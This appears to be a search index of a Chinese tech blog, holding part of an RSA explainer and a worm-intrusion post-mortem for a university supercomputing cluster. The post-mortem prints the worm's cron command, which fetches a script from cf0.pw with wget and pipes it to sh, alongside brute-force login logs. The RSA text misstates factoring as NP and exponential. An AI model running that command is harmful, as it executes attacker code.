\u53c8\u662f\u4e3a\u4e86\u4ec0\u4e48\uff1f\u5728\u6211\u770b\u6765\uff0c\u53ea\u6709\u80fd\u591f\u56de\u7b54\u4e0a\u9762\u8fd9\u4e9b\u95ee\u9898\uff0c\u624d\u80fd\u771f\u6b63\u7b97\u5f97\u4e0a\u5bf9 RSA \u6709\u6240\u7406\u89e3\u3002</p> <p>\u8fd9\u4e00\u5c0f\u8282\uff0c\u6211\u4eec\u5c06\u4f1a\u9488\u5bf9 RSA \u7684\u8bbe\u8ba1\u601d\u60f3\u505a\u4e00\u4e2a\u7b80\u5355\u7684\u8ba8\u8bba\u3002</p> <ul> <li> <p>RSA \u975e\u5bf9\u79f0\u52a0\u5bc6\u7684\u6838\u5fc3\u7279\u5f81</p> <p>\u5176\u5b9e RSA \u6240\u8c13\u7684\u975e\u5bf9\u79f0\u65e0\u975e\u5c31\u662f\u5229\u7528\u4e86\u8fd9\u6837\u4e00\u4e2a\u6027\u8d28\uff1a</p> \\[ M^{ed}\\equiv M\\ (mod\\ n) \\] <p>\u8fd9\u662f\u4e00\u4e2a\u600e\u6837\u7684\u6027\u8d28\u5462\uff1f\u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u6052\u7b49\u6620\u5c04\u7684\u6027\u8d28\uff1a\u4e00\u4e2a\u6570\u5b57\u88ab\u5e42\u51fd\u6570\u53d8\u6362\u540e\uff0c\u603b\u662f\u7b49\u4e8e\u81ea\u5df1\u3002\u3002\u3002\u8fd9\u91cc\u7684\u51fd\u6570\\(f(x)=x^{ed}\\)\u5c31\u662f\u5728\u6a21 n \u7684\u5269\u4f59\u7cfb\u4e2d\u7684\u4e00\u4e2a\u6052\u7b49\u6620\u5c04\u7f62\u4e86\u3002</p> <p>\u6052\u7b49\u6620\u5c04\uff1f\u6052\u7b49\u6620\u5c04\u610f\u5473\u7740\u4ec0\u4e48\u5462\uff1f</p> <p>\u65e0\u8bba\u4ec0\u4e48\u52a0\u5bc6\u7cfb\u7edf\uff0c\u5bf9\u4e8e\u52a0\u5bc6\u51fd\u6570\\(En(x)\\)\u548c\u89e3\u5bc6\u51fd\u6570\\(De(x)\\)\u6765\u8bf4\uff0c\u5b83\u4eec\u7684\u590d\u5408\uff1a\\(En \\cdot De\\) \u5176\u5b9e\u90fd\u662f\u6052\u7b49\u6620\u5c04\u3002\u3002\u3002\u53cd\u8fc7\u6765\u8bb2\uff0c\u4efb\u4f55\u4e00\u4e2a\u6052\u7b49\u6620\u5c04\uff0c\u53ea\u8981\u80fd\u88ab\u5199\u6210\u4e00\u5bf9\u51fd\u6570\u590d\u5408\u7684\u5f62\u5f0f\uff0c\u90a3\u4e48\u8fd9\u5bf9\u51fd\u6570\u5c31\u53ef\u4ee5\u5206\u522b\u4f5c\u4e3a\u52a0\u5bc6\u51fd\u6570\u548c\u89e3\u5bc6\u51fd\u6570\u3002\u3002\u3002</p> <p>\u5de7\u4e86\uff0c\u8fd9\u91cc\u7684\\(f(x)=x^{ed}\\)\u6b63\u597d\u5c31\u53ef\u4ee5\u505a\u8fd9\u6837\u7684\u5206\u89e3\uff1a\\(x^e \u548c x^d\\)\u3002\u3002\u3002\u6240\u4ee5\u8fd9\u5bf9\u51fd\u6570\u5c31\u80fd\u7528\u6765\u52a0\u89e3\u5bc6\u3002\u3002</p> <p>\u4f20\u7edf\u7684\u5bf9\u79f0\u52a0\u5bc6\uff0c\u4f7f\u7528\u7684\u4e00\u5bf9\u52a0\u89e3\u5bc6\u51fd\u6570\u4f9d\u8d56\u4e8e\u76f8\u540c\u7684\u5bc6\u94a5\u3002\u4f46\u662f\u8fd9\u91cc\u51fd\u6570\u7684\u53c2\u6570 e \u548c d \u53ef\u80fd\u662f\u4e0d\u540c\u7684\uff0c\u56e0\u6b64\u52a0\u89e3\u5bc6\u4f9d\u8d56\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u6240\u4ee5\u5c31\u662f\u975e\u5bf9\u79f0\u7684\u3002</p> </li> <li> <p>\u6052\u7b49\u6620\u5c04\u600e\u4e48\u6765\u7684\uff1f</p> <p>\u4e86\u89e3\u4e86\u6240\u8c13\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u7684\u672c\u8d28\u540e\u3002\u6211\u4eec\u7b2c\u4e8c\u4e2a\u95ee\u9898\u81ea\u7136\u662f\uff1a\u8fd9\u4e2a\u6052\u7b49\u6620\u5c04\u662f\u600e\u6837\u7684\uff1f</p> <p>\u5bf9\u4e8e RSA\uff0c\u5b83\u91c7\u7528\u4e86\u5e42\u51fd\u6570\u7684\u5f62\u5f0f\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u5c31\u6765\u8003\u5bdf\u4e00\u4e0b\uff1a\u5e42\u51fd\u6570\u7684\u6307\u6570\u5e94\u8be5\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6\u624d\u80fd\u8ba9\u8fd9\u4e2a\u6620\u5c04\u5728\u7279\u5b9a\u7684\u5269\u4f59\u7cfb\u4e2d\u662f\u4e00\u4e2a\u6052\u7b49\u6620\u5c04\u5462\uff1f</p> \\[ a^x\\equiv a\\ (mod\\ n) \\] <p>\u770b\u5230\u8fd9\u4e2a\u5f62\u5f0f\uff0c\u5f88\u5bb9\u6613\u60f3\u5230\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6216\u8005\u6b27\u62c9\u5b9a\u7406\u3002</p> <p>\u524d\u8005\u7ed9\u51fa\uff1a</p> \\[ a^{p-1}\\equiv1\\ (mod\\ p) \\] <p>\u540e\u8005\u7ed9\u51fa\uff1a</p> \\[ a^{\\Phi(n)}\\equiv 1\\ (mod\\ n) \\] <p>\u5f53\u7136\uff0c\u5f88\u663e\u7136\uff0c\u524d\u8005\u662f\u540e\u8005\u7684\u4e00\u4e2a\u7279\u4f8b\u3002</p> <p>\u6b27\u62c9\u5b9a\u7406\u7684\u6761\u4ef6\u5f88\u5bbd\u677e\uff0c\u53ea\u8981\u6c42 a \u548c n \u4e92\u7d20\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0cn \u53d6\u4e00\u4e2a\u7d20\u6570\uff0ca \u5982\u679c\u5c0f\u4e8e n\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6761\u4ef6\u4e00\u5b9a\u6ee1\u8db3\u3002\u6216\u8005 n \u7684\u7d20\u56e0\u5b50\u5f88\u5c11\uff0c\u4e14\u90fd\u5f88\u5927\uff0ca \u6bd4\u4efb\u610f\u4e00\u4e2a\u7d20\u56e0\u5b50\u90fd\u5c0f\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6761\u4ef6\u4e5f\u4e00\u5b9a\u80fd\u6ee1\u8db3\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u8981\u6784\u9020\u8fd9\u6837\u7684\u4e00\u4e2a\u6052\u7b49\u6620\u5c04\u518d\u5bb9\u6613\u4e0d\u8fc7\u4e86\uff0c\u627e\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684 n\uff0c\u6307\u6570 x \u53d6\\(k*\\Phi(n)+1\\)\u5c31\u884c\u4e86\u3002</p> </li> <li> <p>\u5982\u4f55\u5206\u89e3\uff1f</p> <p>\u6211\u4eec\u5728\u4e00\u5f00\u59cb\u8bf4\u4e86\uff0c\u4e00\u5957\u5bc6\u7801\u7cfb\u7edf\uff0c\u9996\u5148\u8981\u6709\u4e2a\u6052\u7b49\u6620\u5c04\uff0c\u5176\u6b21\u8fd9\u4e2a\u6052\u7b49\u6620\u5c04\u8981\u53ef\u5206\u89e3\u3002</p> <p>\u6240\u4ee5\u5bf9\u4e8e\u6211\u4eec\u627e\u5230\u7684 n\uff0c\u5b83\u7684\u6b27\u62c9\u51fd\u6570\u5fc5\u987b\u8981\u4fdd\u8bc1 \\(k*\\Phi(n)+1=ed\\) \u8fd9\u6837\u7684\u5206\u89e3\u662f\u53ef\u64cd\u4f5c\u7684\u3002</p> <p>\u6362\u53e5\u8bdd\u8bf4\uff1a\\(ed\\equiv1\\ [mod\\ \\Phi(n)]\\)</p> <p>\u518d\u6362\u53e5\u8bdd\u8bf4\uff0ce \u548c d \u518d\u6a21$\\Phi(n) $\u610f\u4e49\u4e0b\u4e92\u4e3a\u4e58\u6cd5\u9006\u5143\uff1f</p> <p>\u5367\u69fd\uff1f\u8fd9\u53e5\u8bdd\u662f\u4e0d\u662f\u5f88\u8033\u719f\uff1fRSA \u4e0d\u662f\u6c42\u4e86 e \u5728\u6a21 (p-1)(q-1) \u610f\u4e49\u4e0b\u7684\u9006\u5143 d \u4e48\uff1f</p> <p>\u4f46\u662f\u4f60\u81ea\u5df1\u60f3\u60f3 (p-1)(q-1) \u7a76\u7adf\u662f\u5565\u5462\uff1f</p> <p>\\((p-1)(q-1)=\\Phi(p)*\\Phi(q)=\\Phi(pq)=\\Phi(n)\\)</p> </li> <li> <p>\u4e3a\u5565 e \u88ab\u8981\u6c42\u548c (p-1)(q-1) \u4e92\u7d20\uff1f</p> <p>\u8fd9\u4e2a\u5728\u4e4b\u524d\u7684RSA \u4e2d\u7684\u6570\u8bba\u77e5\u8bc6\u4e5f\u8bb2\u8fc7\uff0c\u5f53\u4e00\u4e2a\u6570\u548c\u6a21\u6570\u4e92\u7d20\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u9006\u5143\u5b58\u5728\u4e14\u552f\u4e00\u3002\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u5f3a\u8feb e \u4e0e (p-1)(q-1) \u4e92\u7d20\uff0c\u5c31\u662f\u4e3a\u4e86\u4fdd\u8bc1\u5728\u6b27\u62c9\u51fd\u6570$\\Phi(n) $\u4e3a\u6a21\u7684\u5269\u4f59\u4e2d\uff0c\u5b58\u5728\u8fd9\u6837\u4e00\u5bf9\u4e58\u6cd5\u9006\u5143\u3002</p> </li> <li> <p>\u65e2\u7136 n \u53d6\u4e00\u4e2a\u5927\u7d20\u6570\u5c31\u53ef\u4ee5\u5f88\u597d\u7684\u5229\u7528\u6b27\u62c9\u51fd\u6570\u6784\u9020\uff0c\u4e3a\u4ec0\u4e48 RSA \u8fd8\u8981\u7528\u4e00\u5bf9\u5927\u7d20\u6570\u7684\u4e58\u79ef\u4f5c\u4e3a n \u5462\uff1f</p> <p>\u601d\u8003\u8fd9\u6837\u4e00\u4e2a\u95ee\u9898\uff1a\u73b0\u5728\u4f60\u7528\u4e00\u4e2a\u5927\u7d20\u6570\u4f5c\u4e3a n\uff0c\u90a3\u4e48\u663e\u7136\u5b83\u7684\u6b27\u62c9\u51fd\u6570\\(\\Phi(n)=n-1\\)\uff0c\u4f60\u516c\u94a5\u91cc\u9762\u7ed9\u4e86 e \u548c n\uff0c\u6211\u4eec\u77e5\u9053 d \u662f e \u5728\u6a21\u6b27\u62c9\u51fd\u6570$\\Phi(n) $\u610f\u4e49\u4e0b\u7684\u4e58\u6cd5\u9006\u5143\uff0c\u90a3\u4e48\u6211\u6709\u4e86 n-1\uff0c\u6709\u4e86 e\uff0c\u6c42 d \u8fd8\u4e0d\u662f\u5206\u5206\u949f\u949f\u7684\u4e8b\u60c5\u3002\u3002\u3002\u8fd9\u4e2a\u6839\u672c\u6ca1\u4ec0\u4e48\u52a0\u5bc6\u80fd\u529b\u3002\u3002</p> <p>\u4e8e\u662f\u6211\u4eec\u9000\u800c\u6c42\u5176\uff1a\u62ff\u4e00\u4e2a\u6709\u4e24\u4e2a\u5927\u7d20\u6570\u56e0\u5b50 p \u548c q \u7684 n \u6765\u3002\u73b0\u5728 n \u4e0d\u662f\u7d20\u6570\u4e86\uff0c\u4f60\u6709\u4e86 e\uff0c\u8fd8\u9700\u8981\u6211\u7684\u6b27\u62c9\u51fd\u6570\u624d\u80fd\u7b97\u51fa d\u3002\u4f46\u662f\u6211\u7684\u6b27\u62c9\u51fd\u6570\u4e0d\u518d\u50cf\u7d20\u6570\u90a3\u6837\u5c31\u7b49\u4e8e n-1 \u4e86\uff0c\u8981\u6c42\u6211\u7684\u6b27\u62c9\u51fd\u6570\uff0c\u4f60\u5fc5\u987b\u5f97\u6709\u6211\u7684\u4e24\u4e2a\u7d20\u56e0\u5b50 p \u548c q\u3002\u4f46\u662f\u4f17\u6240\u5468\u77e5\uff0c\u5927\u6570\u7684\u8d28\u56e0\u6570\u5206\u89e3\u662f\u4e00\u4e2a NP \u4e3a\u9898\u3002\u563f\u563f\u563f\uff0c\u73b0\u5728\u4f60\u8981\u7834\u89e3\u5c31\u6ca1\u90a3\u4e48\u5bb9\u6613\u4e86\u3002</p> </li> <li> <p>\u603b\u7ed3</p> <p>\u603b\u7ed3\u8d77\u6765\uff0cRSA \u7684\u601d\u8def\u65e0\u975e\u53ef\u4ee5\u6574\u7406\u6210\u8fd9\u6837\u51e0\u70b9\uff1a</p> <ol> <li> <p>\u6211\u60f3\u8981\u4e00\u4e2a\u4ee5\u5269\u4f59\u7cfb\u4e3a\u6570\u57df\uff0c\u5f62\u5f0f\u4e3a\u5e42\u51fd\u6570\u7684\u52a0\u5bc6\u7cfb\u7edf\u3002</p> </li> <li> <p>\u90a3\u4e48\u6211\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u5206\u89e3\u7684\u5e42\u51fd\u6570\u6052\u7b49\u6620\u5c04\u3002</p> </li> <li> <p>\u6211\u53d1\u73b0\u8fd9\u4e2a\u6052\u7b49\u6620\u5c04\u53ef\u4ee5\u7528\u6b27\u62c9\u51fd\u6570\u6784\u9020\u3002</p> </li> <li> <p>\u6784\u9020\u8fd9\u4e2a\u6052\u7b49\u6620\u5c04\u7684\u65f6\u5019\uff0c\u6a21\u6570 n \u8981\u9009\u4e00\u4e2a\u7a0d\u5fae\u597d\u70b9\u7684\uff0c\u6700\u597d\u662f\u4e00\u4e2a\u8d28\u6570\u6216\u8005\u662f\u4e00\u4e2a\u8d28\u56e0\u6570\u5f88\u5c11\u4e14\u5f88\u5927\u7684\u6570\u3002</p> </li> <li> <p>\u8fd9\u4e2a\u6052\u7b49\u6620\u5c04\u8fd8\u9700\u8981\u53ef\u5206\u89e3\u3002</p> </li> <li> <p>\u6211\u53d1\u73b0\uff0c\u53ef\u5206\u89e3\u5176\u5b9e\u7b49\u4ef7\u4e8e\u627e\u4e00\u5bf9$\\Phi(n) $\u4e3a\u6a21\u6570\u7684\u5269\u4f59\u7cfb\u4e2d\u7684\u4e58\u6cd5\u9006\u5143\u3002\u8fd9\u4e5f\u5e76\u4e0d\u662f\u7279\u522b\u96be\u7684\u4e8b\u60c5\u3002\u3002</p> </li> <li> <p>\u597d\u4e86\uff0c\u73b0\u5728\u6211\u60f3\u660e\u767d\u4e86\u3002\u62ff\u4e2a\u5927\u7d20\u6570\u4f5c\u4e3a n \u8bd5\u8bd5\u3002\u6784\u9020\u5012\u662f\u6784\u9020\u51fa\u6765\u4e86\uff0c\u4f46\u662f\u53d1\u73b0\u597d\u50cf\u516c\u5f00\u4e86 e \u548c n\uff0cd \u5f88\u5bb9\u6613\u5c31\u7b97\u51fa\u6765\u4e86\u3002</p> </li> <li> <p>\u90a3\u6211\u518d\u62ff\u4e24\u4e2a\u5927\u7d20\u6570\u7684\u4e58\u79ef\u4f5c\u4e3a n \u8bd5\u8bd5\uff0c\u73b0\u5728\u6211\u53d1\u73b0\u4f60\u597d\u50cf\u8981\u7b97\u51fa d \u5fc5\u987b\u5f97\u7b97\u51fa n \u7684\u6b27\u62c9\u51fd\u6570\uff0c\u800c\u8fd9\u5fc5\u987b\u5148\u89e3\u51b3\u5927\u6570\u8d28\u56e0\u6570\u5206\u89e3\uff0c\u8fd9\u662f\u975e\u5e38\u56f0\u96be\u7684\uff0c\u90a3\u4e48\u73b0\u5728\u6211\u7684\u52a0\u5bc6\u7cfb\u7edf\u5c31\u663e\u5f97\u975e\u5e38\u5b89\u5168\u4e86\u3002</p> </li> <li> <p>\u7136\u540e\u4f60\u8fd8\u4f1a\u60f3\u5230\uff0c\u663e\u7136 n \u4e0d\u4e00\u5b9a\u975e\u8981\u662f\u4e24\u4e2a\u7d20\u56e0\u5b50 p \u548c q \u7684\u4e58\u79ef\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d6\u591a\u4e2a\u5927\u7d20\u6570\u7684\u4e58\u79ef\u6765\u4f5c\u4e3a n\uff0c\u4e5f\u80fd\u8fbe\u5230\u7c7b\u4f3c\u7684\u6548\u679c\u3002</p> </li> </ol> </li> </ul>"},{"location":"blog/2019/06/21/rsa-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%A6%E6%80%9D%E6%83%B3/#\u5b89\u5168\u6027","title":"\u5b89\u5168\u6027","text":"<p>\u5728\u8bbe\u8ba1\u601d\u60f3\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u68b3\u7406\u5f97\u5f88\u6e05\u695a\u4e86\uff0cRSA \u7b97\u6cd5\u672c\u8d28\u4e0a\u5229\u7528\u4e86\u5927\u6570\u5b57\u8d28\u56e0\u6570\u5206\u89e3\u7684\u56f0\u96be\u6027\uff1a\u5bf9\u4e8e\u4e00\u4e2a N \u4f4d\u7684\u6570\u5b57\uff0c\u5bf9\u5176\u8fdb\u884c\u8d28\u56e0\u6570\u5206\u89e3\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u662f\u5173\u4e8e N \u7684\u6307\u6570\u6570\u91cf\u7ea7\uff0c\u4e0d\u5b58\u5728\u591a\u9879\u5f0f\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u3002</p>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/","title":"\u8815\u866b\u75c5\u6bd2\u5165\u4fb5\u4e8b\u4ef6\u59cb\u672b","text":"<p>AI Generated Abstract</p> <p>\u672c\u7bc7\u535a\u5ba2\u8bb0\u5f55\u4e86\u8d85\u7b97\u961f\u96c6\u7fa4\u5728 2025 \u5e74 3 \u6708\u906d\u9047\u8815\u866b\u75c5\u6bd2\u5165\u4fb5\u7684\u5168\u8fc7\u7a0b\uff0c\u5305\u62ec\u4e8b\u53d1\u80cc\u666f\u3001\u5165\u4fb5\u8fd8\u539f\u3001\u4e8b\u6545\u5904\u7406\u53ca\u75c5\u6bd2\u5206\u6790\u3002\u901a\u8fc7\u65e5\u5fd7\u5ba1\u8ba1\u548c\u7cfb\u7edf\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u56e2\u961f\u6210\u529f\u8fd8\u539f\u4e86\u653b\u51fb\u8def\u5f84\uff0c\u5e76\u91c7\u53d6\u4e86\u91cd\u88c5\u6838\u5fc3\u8282\u70b9\u3001\u8c03\u6574\u7f51\u7edc\u7ed3\u6784\u7b49\u5e94\u6025\u63aa\u65bd\uff0c\u6700\u7ec8\u6062\u590d\u96c6\u7fa4\u8fd0\u884c\u3002</p>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u672c\u6b21\u4e8b\u4ef6\u6d89\u53ca\u8d85\u7b97\u961f\u96c6\u7fa4\u548c\u67d0\u5b9e\u9a8c\u5ba4\u96c6\u7fa4\uff0c\u90e8\u5206\u7f51\u7edc\u67b6\u6784\u793a\u610f\u56fe\u5982\u4e0b\uff1a</p> <pre><code>flowchart TD\n n1[\"Internet\"]\n n2[\"OpenWRT\"]\n n2[\"SSH Jump Server\"]\n n3[\"Frp Server&lt;br&gt;OpenWRT\"]\n n1 ---|\"exposed\"| n3\n n3[\"Frp Server&lt;br&gt;(OpenWRT)\"] ---|\"Port Forwarding\"| n2\n n4[\"Campus\"]\n n4 --- n2[\"SSH JumpServer&lt;br&gt;(OpenWRT)\"]\n subgraph s1[\"\u8d85\u7b97\u961f\u5185\u7f51\"]\n  subgraph s2[\"\u8d85\u7b97\u961f\u65e0\u76d8\u96c6\u7fa4\"]\n   n9[\"A700\"]\n   n7[\"M603\"]\n   n8[\"storage&lt;br&gt;\u6709\u72b6\u6001\"]\n  end\n  n5[\"pcie-up\"]\n end\n n2 --- n6[\"\u5176\u4ed6\u670d\u52a1\u5668\"]\n n10[\"SSH Mux&lt;br&gt;(OpenNG)\"]\n n1 ---|\"exposed\"| n10\n n4 --- n10\n n10 --- s2\n n12@{ shape: \"circle\", label: \"\u7aef\u53e3\u6620\u5c04\" }\n n12 --- n5\n n2 --- n12</code></pre> <p>\u8d85\u7b97\u961f\u96c6\u7fa4\u7684\u57fa\u672c\u60c5\u51b5\uff1a</p> <ul> <li>\u65e0\u76d8\u7cfb\u7edf\u67b6\u6784\uff1a<ul> <li>\u4ec5\u6838\u5fc3\u8282\u70b9 storage \u6709\u72b6\u6001\uff0c\u4f5c\u4e3a NFS \u670d\u52a1\u5668\u5b58\u50a8\u6570\u636e\uff0c\u8fd0\u884c\u53ef\u89c2\u6d4b\u6027\u7b49\u670d\u52a1\u3002</li> <li>\u8ba1\u7b97\u8282\u70b9\u65e0\u72b6\u6001\uff0c\u901a\u8fc7 PXE \u5f15\u5bfc\uff0c\u6839\u6587\u4ef6\u7cfb\u7edf\u4e3a OverlayFS\uff0c\u5e95\u5c42\u76ee\u5f55\u6302\u8f7d\u4e3a\u53ea\u8bfb NFS\u3002</li> </ul> </li> <li>\u7528\u6237\u7ba1\u7406\uff1aLDAP\uff0c\u6240\u6709\u8282\u70b9\u4f7f\u7528\u7edf\u4e00\u7684\u7528\u6237\u7cfb\u7edf\u3002</li> <li>\u8bbf\u95ee\u65b9\u5f0f\uff1a<ul> <li>\u5916\u90e8\uff1a\u516c\u7f51\u548c\u6821\u7f51\u66b4\u9732\u7684\u7aef\u53e3\u5747\u53d7 OpenNG\uff08\u961f\u5458\u5f00\u53d1\u7684\u591a\u534f\u8bae\u7f51\u5173\uff09\u4fdd\u62a4\u3002</li> <li>\u5185\u90e8\uff1a\u672a\u505a\u8bbf\u95ee\u63a7\u5236\uff0c\u6240\u6709\u8282\u70b9\u95f4 SSH \u4e92\u901a\u3002</li> </ul> </li> </ul>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/#\u4e8b\u53d1\u8fc7\u7a0b","title":"\u4e8b\u53d1\u8fc7\u7a0b","text":"<p>2025 \u5e74 3 \u6708 13 \u65e5\u665a\uff0c\u6709\u540c\u5b66\u53d1\u73b0\u8ba1\u7b97\u8282\u70b9 M603 DNS \u89e3\u6790\u51fa\u73b0\u95ee\u9898\u3002\u7531\u4e8e\u96c6\u7fa4\u4f7f\u7528\u65e0\u76d8\u7cfb\u7edf\u67b6\u6784\uff0c\u5bf9\u4e8e\u5404\u79cd\u5947\u5947\u602a\u602a\u7684\u6545\u969c\u95ee\u9898\uff0c\u6211\u4eec\u4e60\u60ef\u901a\u8fc7\u91cd\u542f\u89e3\u51b3\u3002\u91cd\u542f\u540e\u4e00\u6bb5\u65f6\u95f4\u5185\u6ca1\u6709\u518d\u6b21\u53d1\u73b0\u95ee\u9898\u3002</p> <p>2025 \u5e74 3 \u6708 15 \u65e5\u4e0a\u5348\uff0cM603 DNS \u89e3\u6790\u518d\u6b21\u51fa\u73b0\u95ee\u9898\u3002\u4e0b\u9762\u662f\u5f53\u65e5\u65f6\u95f4\u7ebf\uff1a</p> <ul> <li>10:47 @star \u53d1\u73b0 <code>/etc/resolv.conf</code> \u88ab\u7be1\u6539\u3002\u7fa4\u5185\u8be2\u95ee\u65e0\u679c\uff0c\u6000\u7591\u6709\u810f\u4e1c\u897f\u3002</li> <li>16:30 @bowling \u5728 A700 \u4e0a\u6d4b\u8bd5\u5e76\u5f00\u542f\u4e86 sudoer \u548c auditd \u5ba1\u8ba1\u3002</li> <li>18:30 @bowling \u53d1\u73b0\u96c6\u7fa4\u5bf9\u5916\u7f51\u4e22\u5305\u7387\u7a81\u53d1\u8fbe\u5230 100%\u3002</li> <li> <p>21:00 @star \u5229\u7528 OverlayFS \u5bf9 lowerdir \u5199\u65f6\u590d\u5236\u7684\u7279\u6027\uff0c\u4ece upperdir <code>/live/cow</code> \u53d1\u73b0\uff1a</p> <ul> <li> <p>\u5173\u952e\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u7be1\u6539\uff1a</p> <pre><code>usr\n\u251c\u2500\u2500 bin\n\u2502   \u251c\u2500\u2500 last\n\u2502   \u251c\u2500\u2500 lastlog\n\u2502   \u251c\u2500\u2500 ls\n\u2502   \u251c\u2500\u2500 netstat\n\u2502   \u251c\u2500\u2500 w\n\u2502   \u2514\u2500\u2500 who\n\u2514\u2500\u2500 sbin\n    \u251c\u2500\u2500 nologin\n    \u2514\u2500\u2500 rmt-tar\n</code></pre> </li> <li> <p><code>/etc/cron.hourly/0</code> \u6709\u5f02\u5e38\u547d\u4ee4\uff1a</p> <pre><code>wget --quiet http://cf0.pw/etc/cron.hourly/0 -O- 2&gt;/dev/null|sh&gt;/dev/null 2&gt;&amp;1\n</code></pre> <p>\u5728 Google \u641c\u7d22\u8be5\u57df\u540d\uff0c\u53d1\u73b0\u5927\u91cf\u5173\u4e8e\u8815\u866b\u75c5\u6bd2\u7684\u4fe1\u606f\u3002</p> </li> </ul> </li> </ul> <p>\u81f3\u6b64\u786e\u8ba4\u96c6\u7fa4\u611f\u67d3\u8815\u866b\u75c5\u6bd2\u3002\u968f\u5373\u5f00\u59cb\u5bf9\u65e5\u5fd7 sudo \u547d\u4ee4\u8fdb\u884c\u5ba1\u8ba1\uff0c\u8fd8\u539f\u5165\u4fb5\u8fc7\u7a0b\u3002</p>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/#\u5165\u4fb5\u8fd8\u539f","title":"\u5165\u4fb5\u8fd8\u539f","text":"<p>\u5165\u4fb5\u8fd8\u539f\u4e3b\u8981\u901a\u8fc7\u65e5\u5fd7\u884c\u4e3a\u5ba1\u8ba1\u3001\u8be2\u95ee\u76f8\u5173\u4eba\u5458\u3001\u5bf9\u7cfb\u7edf\u8fdb\u884c\u5b8c\u6574\u6027\u6821\u9a8c\u7b49\u65b9\u5f0f\u8fdb\u884c\u3002</p> <ul> <li>2025-03-06 04:25:34 \u67d0\u5b9e\u9a8c\u5ba4 JumpServer \u88ab\u6821\u56ed\u7f51 IPS \u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u53d1\u73b0\u4e3a\u53e3\u4ee4\u7834\u89e3\u653b\u51fb\u6e90\u3002</li> <li> <p>2025-03-13 04:52:05 \u653b\u51fb\u8005\u901a\u8fc7\u6682\u672a\u67e5\u660e\u6765\u6e90\u7684 SSH \u5bc6\u94a5\u767b\u5f55 <code>zzm</code> \u8d26\u6237\uff0c\u7ecf JumpServer \u5165\u4fb5 pcie-up \u670d\u52a1\u5668\u3002\u5165\u4fb5\u540e\u7acb\u523b\u5f00\u59cb\u66b4\u529b\u7834\u89e3\u670d\u52a1\u5668\u4e0a\u6240\u6709\u8d26\u6237\u7684\u5bc6\u7801\uff0c\u65e5\u5fd7\u4e2d\u51fa\u73b0\u5927\u91cf\u5931\u8d25\u7684 <code>su</code> \u8bb0\u5f55\uff1a</p> <pre><code>Mar 13 04:52:05 sct-pcie5-up sshd[662845]: Accepted publickey for zzm from ***.***.***.***(JumpServer) port 40744 ssh2: RSA SHA256:PJYq6uB2Vyeytlv5GzB/VRUHxhdpIj0kfl/WRbhxWII\nMar 13 04:52:05 sct-pcie5-up sshd[662845]: pam_unix(sshd:session): session opened for user zzm(uid=1021) by (uid=0)\nMar 13 04:52:05 sct-pcie5-up systemd-logind[2534]: New session 252 of user zzm.\nMar 13 04:52:05 sct-pcie5-up systemd[662848]: pam_unix(systemd-user:session): session opened for user zzm(uid=1021) by (uid=0)\nMar 13 04:52:05 sct-pcie5-up systemd[1]: Started Session 252 of User zzm.\nMar 13 04:54:47 sct-pcie5-up sudo[663151]:      zzm : command not allowed ; TTY=pts/0 ; PWD=/home/zzm ; USER=root ; COMMAND=validate\nMar 13 04:56:08 sct-pcie5-up su[663188]: pam_unix(su:auth): authentication failure; logname=zzm uid=1021 euid=0 tty=/dev/pts/0 ruser=zzm rhost=  user=zx\n...\nMar 13 04:57:04 sct-pcie-up su[710316]: pam_unix(su:auth): authentication failure; logname= uid=1021 euid=0 tty= ruser=zzm rhost= user=root\nMar 13 04:57:06 sct-pcie-up su[710316]: FAILED SU (to root) zzm on none\n</code></pre> </li> <li> <p>2025-03-13 06:04:42 \u653b\u51fb\u8005\u6210\u529f\u7834\u89e3\u5f31\u5bc6\u7801\u8d26\u6237 <code>zjusct</code>\uff0c\u5f00\u59cb\u6536\u96c6\u670d\u52a1\u5668\u4fe1\u606f\u3002<code>tkandi</code> \u5728\u8be5\u670d\u52a1\u5668\u4e0a\u7559\u4e0b\u4e86\u767b\u5f55\u8d85\u7b97\u961f\u96c6\u7fa4\u7684\u5bc6\u94a5\u548c\u914d\u7f6e\u6587\u4ef6\uff0c\u4e5f\u88ab\u7a83\u53d6\u3002</p> <pre><code>Mar 13 06:04:42 sct-pcie5-up su[741663]: pam_unix(su:session): session opened for user zjusct(uid=1000) by zzm(uid=1021)\nMar 13 06:04:50 sct-pcie5-up sudo[741671]: pam_unix(sudo:session): session opened for user root(uid=0) by 